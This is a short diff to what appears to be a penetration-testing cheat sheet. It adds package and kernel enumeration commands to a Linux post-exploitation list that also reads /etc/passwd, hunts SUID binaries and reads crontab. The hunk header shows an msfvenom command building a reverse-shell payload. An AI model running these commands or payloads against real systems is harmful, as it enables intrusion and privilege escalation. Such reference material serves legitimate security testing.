@@ -180,6 +180,9 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TARGET LPORT=$PORT -f elf -o rshe
 #### Linux
 ```bash
 whoami
+uname -a
+dpkg -l # debian
+rpm -qa # red hat
 cat /etc/passwd
 find / -perm -u=s -type f 2> /dev/null
 cat /etc/crontab
